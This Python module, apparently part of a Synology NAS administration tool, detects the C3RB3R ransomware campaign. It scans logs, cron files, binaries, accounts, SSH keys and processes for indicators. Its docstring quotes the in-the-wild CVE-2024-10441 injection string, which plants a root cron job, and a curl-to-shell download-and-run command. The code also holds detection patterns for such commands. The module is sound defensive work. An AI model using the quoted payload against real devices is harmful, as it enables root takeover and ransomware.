"""Indicators of compromise for the C3RB3R / .L0CK3D campaign.

Observed in the wild (2026-10-28): the attacker signs in to DSM (SYNO.API.Auth v7 login) with an account
field such as

    admin\\nPLUGIN_VALUE_END\\nLD_PRELOAD=PLUGIN_VALUE_START\\nNOP\\n*\\t*\\t*\\t*\\t*\\troot\\techo\\t<base64>\\t|base64\\t-d|sh
    \\nNOP\\nPLUGIN_VALUE_END\\nLD_DEBUG=libs\\nLD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>\\nESCAPE=PLUGIN_VALUE_START\\nNOP

(CVE-2024-10441, Synology-SA-24:20): the system plugin daemon passes the injected variables on, glibc's
LD_DEBUG output (which contains the cron line) lands in /etc/cron.d/synot*, and cron runs
`curl -s http://<IP>/xdy5.sh|sh` as root. Reported follow-ups (dylab.org/archives/1128): xdy5.sh saves the
encryptor as /bin/qnetd and starts it, downloads /bin/libgld as a backup payload (one victim saw the
encryption process under that name), and creates /bin/l0ck.enc as a marker so only one encryption process
runs.

- `exploit_attempts`: the DSM connection log (normal session) for the injection strings and IOC addresses.
- `nas incident --deep`: COLLECTOR runs once as root (temporary Task Scheduler task, or directly with
  --backend local), reads /var/log, /etc, /proc and a few system folders, and writes one JSON document.
  Nothing else is written. Everything taken from logs is data: escaped and length-capped before display.
"""

from __future__ import annotations

import base64
import binascii
import ipaddress
import json
import re
import secrets
import shlex
import subprocess
import sys
import zlib

from . import config
from .errors import NasError

MARKERS = ["PLUGIN_VALUE_END", "LD_PRELOAD=", "LD_DEBUG_OUTPUT"]
BAD_NAMES = ("libgld", "qnetd", "l0ck.enc")
_B64 = re.compile(r"echo(?:\s|\\t)+([A-Za-z0-9+/]{12,}={0,2})")
_CRON_TARGET = re.compile(r"LD_DEBUG_OUTPUT=([^\s\\'\"]+)")
_IPV4 = re.compile(r"(?<![\d.])(\d{1,3}(?:\.\d{1,3}){3})(?![\d.])")
_FROM = re.compile(r"from \[([^\]]*)\]")
_TIME = re.compile(r"\d{4}[-/]\d{2}[-/]\d{2}[T ]\d{2}:\d{2}:\d{2}")


def clean(value, limit: int = 200) -> str:
    """Printable text: control characters as \\xNN / \\n / \\t, at most `limit` characters."""
    out = []
    for ch in str(value):
        if ch == "\n":
            out.append("\\n")
        elif ch == "\t":
            out.append("\\t")
        elif ch.isprintable():
            out.append(ch)
        else:
            out.append("\\x%02x" % ord(ch) if ord(ch) < 256 else "\\u%04x" % ord(ch))
    s = "".join(out)
    return s if len(s) <= limit else s[:limit] + "..."


def ioc_lists() -> tuple:
    inc = config.get()["incident"]
    return list(inc["ioc_ips"]), MARKERS + list(inc["ioc_strings"])


def scan_text(text: str) -> dict:
    """What an injection attempt carries: addresses, cron files it targets, decoded commands (as data)."""
    ips, strings = ioc_lists()
    hit = [m for m in strings if m in text] + [ip for ip in ips if ip in text]
    commands = []
    for b in _B64.findall(text):
        try:
            commands.append(clean(base64.b64decode(b + "=" * (-len(b) % 4)).decode("utf-8", "replace"), 160))
        except (binascii.Error, ValueError):
            continue
    found_ips = [ip for ip in dict.fromkeys(_IPV4.findall(text + " " + " ".join(commands)))
                 if _is_global(ip)]
    return {"markers": hit, "ips": found_ips, "cron_targets": sorted(set(_CRON_TARGET.findall(text))),
            "commands": list(dict.fromkeys(commands))}


def _short(ip: str) -> str:
    try:
        return str(ipaddress.ip_address(ip))
    except ValueError:
        return ip


def _hostport(ip: str, port) -> str:
    ip = clean(_short(ip), 45)
    return f"[{ip}]:{port}" if ":" in ip else f"{ip}:{port}"


def _is_global(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_global
    except ValueError:
        return False


def summarize(events: list) -> dict:
    """events: [{"time", "text", "source"?}] -> counts, first/last, addresses, cron targets, commands.
    Addresses come from the lines that carry a marker or IOC address and from the decoded commands, not from
    surrounding context lines (other sign-in noise)."""
    ips_cfg, strings = ioc_lists()
    out = {"count": len(events), "first": None, "last": None, "ips": [], "cron_targets": [], "commands": []}
    times = sorted(e["time"] for e in events if e.get("time"))
    if times:
        out["first"], out["last"] = times[0], times[-1]
    for e in events:
        sc = scan_text(e["text"])
        focus = "\n".join(l for l in e["text"].splitlines() if any(m in l for m in strings + ips_cfg))
        ips = [ip for ip in dict.fromkeys(_IPV4.findall(focus + " " + " ".join(sc["commands"]))) if _is_global(ip)]
        for k, vals in (("ips", ips + ([e["source"]] if e.get("source") else [])),
                        ("cron_targets", sc["cron_targets"]), ("commands", sc["commands"])):
            out[k] += [x for x in vals if x not in out[k]]
    return out


def connection_log_attempts(items: list) -> list:
    """Connection-log entries that carry the injection strings or come from an IOC address."""
    ips, strings = ioc_lists()
    out = []
    for x in items or []:
        d = x.get("descr") or ""
        src = (_FROM.search(d) or [None, ""])[1]
        if any(m in d for m in strings) or any(ip == src or ip in d for ip in ips):
            out.append({"time": x.get("time"), "text": d, "source": src if _is_global(src) else None})
    return out


def describe(s: dict) -> str:
    parts = [f"{s['count']} sign-in attempt(s) carrying the CVE-2024-10441 injection or from IOC addresses"]
    if s["first"]:
        parts.append(f"first {clean(s['first'], 25)}, last {clean(s['last'], 25)}")
    if s["ips"]:
        parts.append("from " + ", ".join(clean(i, 45) for i in s["ips"][:8]))
    if s["cron_targets"]:
        parts.append("cron files targeted: " + ", ".join(clean(t, 60) for t in s["cron_targets"][:8]))
    if s["commands"]:
        parts.append("decoded commands: " + "; ".join(clean(c, 120) for c in s["commands"][:4]))
    return "; ".join(parts)


# --- the root-side collector (Python 3.8 on the NAS; reads only, writes one result file) -----------------

COLLECTOR = r'''
import base64, glob, gzip, hashlib, json, lzma, os, re, stat, sys, time
OUT, TOKEN, CFG = sys.argv[1], sys.argv[2], json.loads(sys.argv[3])
R = CFG.get("root", "")
MARKERS = CFG["markers"]
IPS = CFG["ips"]
res = {"marker": TOKEN, "version": 1, "time": time.strftime("%Y-%m-%d %H:%M:%S"), "errors": []}


def P(p):
    return R + p


def err(where, e):
    res["errors"].append("%s: %s" % (where, str(e)[:200]))


def opener(p):
    if p.endswith(".xz"):
        return lzma.open(p, "rt", encoding="utf-8", errors="replace")
    if p.endswith(".gz"):
        return gzip.open(p, "rt", encoding="utf-8", errors="replace")
    return open(p, "r", encoding="utf-8", errors="replace")


def info(p):
    try:
        st = os.lstat(p)
    except OSError:
        return None
    d = {"path": p[len(R):], "size": st.st_size, "mtime": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
         "mode": oct(st.st_mode & 0o7777), "uid": st.st_uid, "link": stat.S_ISLNK(st.st_mode)}
    if stat.S_ISREG(st.st_mode) and st.st_size <= 20 * 1024 * 1024:
        try:
            with open(p, "rb") as f:
                d["sha256"] = hashlib.sha256(f.read()).hexdigest()
        except OSError:
            pass
    return d


def text(p, cap):
    try:
        with open(p, "r", encoding="utf-8", errors="replace") as f:
            return f.read(cap)
    except OSError as e:
        err(p[len(R):], e)
        return None


# (a) logs
events, auth = [], {}
for base in ("synoplugin", "synoscgi", "auth"):
    for p in sorted(glob.glob(P("/var/log/%s.log*" % base))):
        try:
            if os.path.getsize(p) > 256 * 1024 * 1024:
                err(p[len(R):], "larger than 256 MB, skipped")
                continue
            with opener(p) as f:
                lines = f.read().splitlines()
        except Exception as e:
            err(p[len(R):], e)
            continue
        i, n = 0, 0
        while i < len(lines):
            ln = lines[i]
            if base == "auth" and "authentication failure" in ln and "rhost=" in ln and not re.search(r"(^|\s)user=", ln):
                m = re.search(r"rhost=(\S+)", ln)
                a = auth.setdefault(m.group(1) if m else "?", {"count": 0, "first": None, "last": None})
                a["count"] += 1
                t = ln.split(" ", 1)[0][:40]
                a["first"] = min(a["first"], t) if a["first"] else t
                a["last"] = max(a["last"], t) if a["last"] else t
            if any(k in ln for k in MARKERS) or any(ip in ln for ip in IPS):
                j = min(len(lines), i + 14)
                if n < 300:
                    events.append({"file": p[len(R):], "line": i + 1, "text": "\n".join(lines[max(0, i - 3):j])[:6000]})
                n += 1
                i = j
                continue
            i += 1
        if n > 300:
            err(p[len(R):], "%d more matching blocks not included" % (n - 300))
res["log_events"] = events
res["auth_no_user"] = auth

# (b) known files
found = []
for p in ["/bin/libgld", "/bin/qnetd", "/bin/l0ck.enc", "/usr/bin/libgld", "/usr/bin/qnetd"]:
    if os.path.lexists(P(p)):
        found.append(info(P(p)))
for p in glob.glob(P("/etc/cron.d/synot*")):
    found.append(info(p))
for top in ["/tmp", "/var/tmp", "/dev/shm", "/root", "/etc", "/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin",
            "/var/run", "/var/spool"]:
    base_depth = P(top).rstrip("/").count("/")
    for dirpath, dirs, files in os.walk(P(top), onerror=lambda e: None):
        if dirpath.count("/") - base_depth >= 3:
            dirs[:] = []
        for n in files + dirs:
            if n.lower().startswith("xdy5") or n in ("libgld", "qnetd", "l0ck.enc"):
                found.append(info(os.path.join(dirpath, n)))
seen = set()
res["files"] = [f for f in found if f and not (f["path"] in seen or seen.add(f["path"]))]

# (c) cron
cron = {"crontab": None, "cron_d": [], "spool": []}
p = P("/etc/crontab")
if os.path.exists(p):
    cron["crontab"] = dict(info(p) or {}, text=text(p, 20000))
for p in sorted(glob.glob(P("/etc/cron.d/*")) + glob.glob(P("/etc/cron.d/.*"))):
    d = info(p) or {"path": p[len(R):]}
    if os.path.isfile(p):
        d["text"] = text(p, 6000)
    cron["cron_d"].append(d)
for p in sorted(glob.glob(P("/var/spool/cron/*")) + glob.glob(P("/var/spool/cron/crontabs/*"))):
    d = info(p) or {"path": p[len(R):]}
    if os.path.isfile(p):
        d["text"] = text(p, 6000)
    cron["spool"].append(d)
res["cron"] = cron

# (d) users
users = []
try:
    with open(P("/etc/passwd"), encoding="utf-8", errors="replace") as f:
        for line in f:
            parts = line.rstrip("\n").split(":")
            if len(parts) < 7 or not parts[2].isdigit():
                continue
            uid = int(parts[2])
            if uid >= 1024 or (uid == 0 and parts[0] != "root"):
                users.append({"name": parts[0], "uid": uid, "gid": parts[3], "home": parts[5], "shell": parts[6]})
except OSError as e:
    err("/etc/passwd", e)
res["users"] = users
try:
    res["packages"] = sorted(os.listdir(P("/var/packages")))
except OSError:
    res["packages"] = []

# (e) authorized_keys
keys, done = [], set()
for p in [P("/root/.ssh/authorized_keys"), P("/root/.ssh/authorized_keys2")] + \
        glob.glob(P("/var/services/homes/*/.ssh/authorized_keys*")) + glob.glob(P("/volume*/homes/*/.ssh/authorized_keys*")):
    if not os.path.isfile(p):
        continue
    rp = os.path.realpath(p)
    if rp in done:
        continue
    done.add(rp)
    lines = [l.strip() for l in (text(p, 200000) or "").splitlines() if l.strip() and not l.strip().startswith("#")]
    keys.append(dict(info(p) or {}, keys=[{"type": (l.split() + [""])[0][:40], "comment": " ".join(l.split()[2:])[:120],
                                          "tail": l.split()[1][-16:] if len(l.split()) > 1 else ""} for l in lines[:50]],
                     count=len(lines)))
res["ssh_keys"] = keys

# (f) processes, (g) connections
procs, inodes = [], {}
for pid in os.listdir(P("/proc")) if os.path.isdir(P("/proc")) else []:
    if not pid.isdigit():
        continue
    d = P("/proc/" + pid)
    try:
        exe = os.readlink(d + "/exe")
    except OSError:
        continue
    try:
        with open(d + "/cmdline", "rb") as f:
            cmd = f.read(400).replace(b"\0", b" ").decode("utf-8", "replace").strip()
    except OSError:
        cmd = ""
    try:
        with open(d + "/cgroup", encoding="utf-8", errors="replace") as f:
            cg = f.read(2000)
    except OSError:
        cg = ""
    procs.append({"pid": int(pid), "exe": exe, "cmdline": cmd, "container": ("docker" in cg or "containerd" in cg)})
    try:
        for fd in os.listdir(d + "/fd"):
            try:
                l = os.readlink(d + "/fd/" + fd)
            except OSError:
                continue
            if l.startswith("socket:["):
                inodes[l[8:-1]] = int(pid)
    except OSError:
        pass
res["processes"] = procs


def hexaddr(h):
    a, port = h.split(":")
    b = bytes.fromhex(a)
    if len(b) == 4:
        ip = ".".join(str(x) for x in b[::-1])
    else:
        words = [b[i:i + 4][::-1] for i in range(0, 16, 4)]
        raw = b"".join(words)
        ip = ":".join("%x" % int.from_bytes(raw[i:i + 2], "big") for i in range(0, 16, 2))
        if raw[:12] == b"\0" * 10 + b"\xff\xff":
            ip = ".".join(str(x) for x in raw[12:])
    return ip, int(port, 16)


conns = []
for name in ("tcp", "tcp6"):
    p = P("/proc/net/" + name)
    try:
        with open(p) as f:
            next(f)
            for line in f:
                c = line.split()
                if len(c) < 10 or c[3] != "01":
                    continue
                lip, lport = hexaddr(c[1])
                rip, rport = hexaddr(c[2])
                pid = inodes.get(c[9])
                exe = next((x["exe"] for x in procs if x["pid"] == pid), None)
                conns.append({"local": "%s:%d" % (lip, lport), "remote_ip": rip, "remote_port": rport, "pid": pid,
                              "exe": exe})
    except (OSError, StopIteration, ValueError) as e:
        if os.path.exists(p):
            err(p[len(R):], e)
res["connections"] = conns

data = (json.dumps(res) + "\n").encode()
if OUT == "-":
    sys.stdout.buffer.write(data)
else:
    fd = os.open(OUT, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, 0o644)
    os.write(fd, data)
    os.close(fd)
'''


def collector_config(root: str = "") -> dict:
    ips, strings = ioc_lists()
    return {"root": root, "markers": strings, "ips": ips}


def collect(s, root: str = "", timeout: float = 600) -> dict:
    """Run COLLECTOR as root and return its JSON (raises NasError)."""
    return run_root_python(s, COLLECTOR, collector_config(root), "nas-incident-deep", "deep collector",
                           root=root, timeout=timeout)


def run_root_python(s, code: str, cfg: dict, task: str, what: str, root: str = "", timeout: float = 600) -> dict:
    """Run a Python 3.8 script as root once and return the JSON it writes.

    The script gets argv OUT TOKEN CFG and writes {"marker": TOKEN, ...} to OUT ("-" = stdout). With
    --backend local (or `root` set, for tests) it runs here; with --backend password it runs in a temporary
    root Task Scheduler task and writes OUT into deploy.stage_dir (O_EXCL|O_NOFOLLOW), which is read back
    and deleted, as is the task."""
    token = secrets.token_hex(12)
    cfg_s = json.dumps(cfg)
    if s.backend_name == "local" or root:
        p = subprocess.run([sys.executable if root else "python3", "-I", "-B", "-", "-", token, cfg_s],
                           input=code.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        if p.returncode != 0:
            raise NasError(f"{what} failed: " + clean(p.stderr.decode("utf-8", "replace")[-400:], 400))
        return _parse(p.stdout.decode("utf-8", "replace"), token, what)
    if s.backend_name != "password":
        raise NasError(f"{what}: runs with --backend password (a temporary root task) or --backend local on the NAS")
    from .selfmon import _read_stage_file, _stage, run_root_script
    stage, stage_fs = _stage(s)
    name = f"{task}-{token}.json"
    s.call("SYNO.FileStation.CreateFolder", "create", version=2, params={
        "folder_path": json.dumps([stage.rsplit("/", 1)[0] or "/"]), "name": json.dumps([stage.rsplit("/", 1)[1]]),
        "force_parent": True})
    script = task_script(stage_fs, name, token, cfg_s, code)
    got = {}

    def done(s_):
        body = _read_stage_file(s_, stage, name)
        if body and body.rstrip().endswith("}"):
            try:
                got["data"] = _parse(body, token, what)
            except NasError as e:
                got["error"] = str(e)
            return True
        return False

    try:
        ok = run_root_script(s, task, script, done=done, timeout=timeout)
    finally:
        s.call("SYNO.FileStation.Delete", "start", version=2,
               params={"path": json.dumps([f"{stage}/{name}"]), "recursive": False})
    if "error" in got:
        raise NasError(got["error"])
    if not ok or "data" not in got:
        raise NasError(f"the {what} wrote no result within {int(timeout)} s")
    return got["data"]


def task_script(stage_fs: str, name: str, token: str, cfg: str, code: str = COLLECTOR) -> str:
    """Root task: stop on a symlinked staging folder, run the script (zlib + base64 on stdin) once."""
    blob = base64.b64encode(zlib.compress(code.encode(), 9)).decode()
    lines = "\n".join(blob[i:i + 76] for i in range(0, len(blob), 76))
    return (f"umask 022\nS={shlex.quote(stage_fs)}\n"
            '[ -L "$S" ] && { echo "staging folder is a symlink"; exit 0; }\n'
            "python3 -I -B -c 'import base64,sys,zlib; exec(zlib.decompress(base64.b64decode(sys.stdin.read())))' "
            f"\"$S/{name}\" {shlex.quote(token)} {shlex.quote(cfg)} <<'B64'\n{lines}\nB64\n")


def _parse(body: str, token: str, what: str = "deep collector") -> dict:
    try:
        d = json.loads(body)
    except ValueError:
        raise NasError(f"{what} result is not JSON")
    if not isinstance(d, dict) or d.get("marker") != token:
        raise NasError(f"{what} result has the wrong marker (not written by this run)")
    return d


# --- verdicts --------------------------------------------------------------------------------------------

_ALLOWED_EXE = re.compile(r"^(/usr/syno/|/usr/bin/|/usr/sbin/|/bin/|/sbin/|/usr/lib/|/usr/lib64/|/lib/|/lib64/|"
                          r"/usr/libexec/|/usr/local/|/usr/share/|/var/packages/|/volume\d+/@appstore/|"
                          r"/volume\d+/@docker/|/volume\d+/@apphome/)")
_TMP_EXE = re.compile(r"^(/tmp/|/var/tmp/|/dev/shm/|/run/shm/)")
_BAD_CRON = re.compile(r"base64\s+-d|\|\s*(sh|bash)\b|curl\s|wget\s|xdy5|PLUGIN_VALUE|LD_DEBUG", re.I)
_CRON_OK_CMD = re.compile(r"^(/usr/syno/|/usr/bin/|/usr/sbin/|/bin/|/sbin/|/var/packages/|/usr/local/)")
BUILTIN_USERS = {"admin", "guest"}


def _cron_lines(txt: str) -> list:
    return [l for l in (txt or "").splitlines() if l.strip() and not l.lstrip().startswith("#")
            and not re.match(r"^\s*[A-Z_]+=", l)]


def _cron_command(line: str) -> str:
    """The command of a system crontab line (5 time fields, user, command)."""
    parts = line.split(None, 6)
    return parts[6] if len(parts) == 7 else line


def evaluate_deep(d: dict, item) -> list:
    ips, strings = ioc_lists()
    inc = config.get()["incident"]
    items = []

    # exploit attempts recorded in the root-only logs
    events = [{"time": (_TIME.search(e["text"]) or [None])[0], "text": e["text"]} for e in d.get("log_events") or []]
    auth = d.get("auth_no_user") or {}
    ioc_auth = {ip: a for ip, a in auth.items() if ip in ips}
    if events or ioc_auth:
        s = summarize(events)
        bits = [describe(s).replace("sign-in attempt(s)", "log block(s)") if events else "no injection blocks"]
        if ioc_auth:
            bits.append("auth.log failures without user= from IOC addresses: " + ", ".join(
                f"{clean(ip, 45)} x{a['count']} ({clean(a['first'], 25)}..{clean(a['last'], 25)})"
                for ip, a in sorted(ioc_auth.items())))
        files = sorted({e["file"] for e in d.get("log_events") or []})
        if files:
            bits.append("in " + ", ".join(clean(f, 60) for f in files[:6]))
        other = {ip: a for ip, a in auth.items() if ip not in ips}
        if other:
            bits.append(f"context: {sum(a['count'] for a in other.values())} other auth.log failures without user= "
                        f"from {len(other)} address(es) (password guessing logs that too)")
        items.append(item("exploit_attempts_logs", "WARN", "; ".join(bits),
                          "attempts only: ioc_cron / ioc_binaries / ioc_processes show whether one succeeded"))
    else:
        items.append(item("exploit_attempts_logs", "PASS", "no injection strings or IOC addresses in "
                          "/var/log/synoplugin.log*, synoscgi.log*, auth.log*"
                          + (f" ({sum(a['count'] for a in auth.values())} auth.log failures without user= from "
                             f"{len(auth)} other address(es))" if auth else "")))

    # cron
    cron = d.get("cron") or {}
    targets = set(summarize(events)["cron_targets"]) if events else set()
    bad, unknown, listing = [], [], []
    for entry in ([cron.get("crontab")] if cron.get("crontab") else []) + list(cron.get("cron_d") or []) + \
            list(cron.get("spool") or []):
        path = entry.get("path", "?")
        listing.append(f"{clean(path, 60)} ({clean(entry.get('mtime'), 20)})")
        name = path.rsplit("/", 1)[-1]
        if name.startswith("synot") or path in targets:
            bad.append(f"{clean(path, 60)} exists")
        for line in _cron_lines(entry.get("text")):
            if _BAD_CRON.search(line) or any(x in line for x in ips + strings):
                bad.append(f"{clean(path, 60)}: {clean(line, 140)}")
            elif not _CRON_OK_CMD.match(_cron_command(line).strip()):
                unknown.append(f"{clean(path, 60)}: {clean(line, 140)}")
    if bad:
        items.append(item("ioc_cron", "FAIL", "; ".join(bad[:6]), "a planted cron job runs as root: isolate the NAS "
                          "and follow docs/INCIDENT-C3RB3R.md"))
    elif unknown:
        items.append(item("ioc_cron", "WARN", "cron lines outside Synology paths: " + "; ".join(unknown[:6]),
                          "check that you created them"))
    else:
        items.append(item("ioc_cron", "PASS", "no synot* files or download-and-run lines; " + ", ".join(listing[:8])))

    # files
    files = d.get("files") or []
    if files:
        items.append(item("ioc_binaries", "FAIL", "; ".join(
            f"{clean(f.get('path'), 60)} ({f.get('size')} bytes, {clean(f.get('mtime'), 20)}"
            + (f", sha256 {clean(f.get('sha256'), 64)}" if f.get("sha256") else "") + ")" for f in files[:8]),
            "known C3RB3R files: isolate the NAS, keep copies for analysis, follow docs/INCIDENT-C3RB3R.md"))
    else:
        items.append(item("ioc_binaries", "PASS", "none of /etc/cron.d/synot*, libgld, qnetd, l0ck.enc, xdy5* found"))

    # users
    allowed = set(inc["allowed_users"]) | BUILTIN_USERS
    packages = set(d.get("packages") or [])
    root_twins = [u for u in d.get("users") or [] if u.get("uid") == 0]
    others = [u for u in d.get("users") or [] if u.get("uid", 0) >= 1024 and u.get("name") not in allowed
              and u.get("name") not in packages and not str(u.get("home", "")).startswith("/var/packages/")]
    if root_twins:
        items.append(item("ioc_users", "FAIL", "accounts with uid 0 besides root: " + ", ".join(
            clean(u["name"], 40) for u in root_twins), "a second root account: isolate the NAS"))
    elif others:
        items.append(item("ioc_users", "WARN", "local accounts (uid >= 1024) not in incident.allowed_users: " + ", ".join(
            f"{clean(u['name'], 40)} (uid {u['uid']}, shell {clean(u.get('shell'), 30)})" for u in others[:12]),
            "add the ones you know to incident.allowed_users; disable or delete the rest"))
    else:
        items.append(item("ioc_users", "PASS", "no unknown local accounts"))

    # ssh keys
    keyfiles = d.get("ssh_keys") or []
    flagged = [k for k in keyfiles if any(x in json.dumps(k) for x in ips)]
    if flagged:
        items.append(item("ioc_ssh_keys", "FAIL", "authorized_keys mentioning IOC addresses: " + ", ".join(
            clean(k.get("path"), 80) for k in flagged)))
    elif keyfiles:
        items.append(item("ioc_ssh_keys", "WARN", "; ".join(
            f"{clean(k.get('path'), 80)}: {k.get('count')} key(s) "
            + ", ".join(f"{clean(x['type'], 20)} ...{clean(x['tail'], 16)} {clean(x['comment'], 40)}".strip()
                        for x in k.get("keys", [])[:3]) for k in keyfiles[:6]),
            "check that every key is yours; root keys allow SSH logins as root"))
    else:
        items.append(item("ioc_ssh_keys", "PASS", "no authorized_keys for root or any home"))

    # processes and outbound connections
    procs = d.get("processes") or []
    bad_p, odd_p, cont = [], [], []
    for p in procs:
        exe = str(p.get("exe") or "")
        base = exe.replace(" (deleted)", "").rsplit("/", 1)[-1]
        label = f"pid {p.get('pid')} {clean(exe, 80)} ({clean(p.get('cmdline'), 80)})"
        if base in BAD_NAMES or base.lower().startswith("xdy5") or _TMP_EXE.match(exe):
            bad_p.append(label)
        elif p.get("container"):
            cont.append(p)
        elif exe.endswith("(deleted)") or not _ALLOWED_EXE.match(exe):
            odd_p.append(label)
    conns = [c for c in d.get("connections") or [] if _is_global(str(c.get("remote_ip")))]
    ioc_conns = [c for c in conns if c.get("remote_ip") in ips]
    conn_txt = "; outbound connections to public addresses (report only): " + (", ".join(
        f"{_hostport(c['remote_ip'], c.get('remote_port'))} {clean(c.get('exe') or '?', 60)}" for c in conns[:10])
        if conns else "none")
    if bad_p or ioc_conns:
        items.append(item("ioc_processes", "FAIL", "; ".join(bad_p[:6] + [
            f"connection to IOC address {clean(c['remote_ip'], 45)}:{c.get('remote_port')} by {clean(c.get('exe'), 60)}"
            for c in ioc_conns]) + conn_txt, "a known-bad process is running: isolate the NAS"))
    elif odd_p:
        items.append(item("ioc_processes", "WARN", "processes outside Synology paths: " + "; ".join(odd_p[:8]) + conn_txt,
                          "check what they are (a replaced binary after an update also shows as '(deleted)')"))
    else:
        items.append(item("ioc_processes", "PASS", f"{len(procs)} processes, all under Synology paths"
                          + (f" ({len(cont)} in containers)" if cont else "") + conn_txt))
    if d.get("errors"):
        items.append(item("ioc_collector", "WARN", "collector could not read: " + "; ".join(
            clean(e, 120) for e in d["errors"][:5])))
    return items


DEEP_IDS = ["exploit_attempts_logs", "ioc_cron", "ioc_binaries", "ioc_users", "ioc_ssh_keys", "ioc_processes"]


def sanitized(d: dict) -> dict:
    """Collector output for --json: log text kept (JSON escapes control characters), sizes capped."""
    out = dict(d)
    out["log_events"] = [dict(e, text=str(e.get("text", ""))[:6000]) for e in (d.get("log_events") or [])[:300]]
    return out
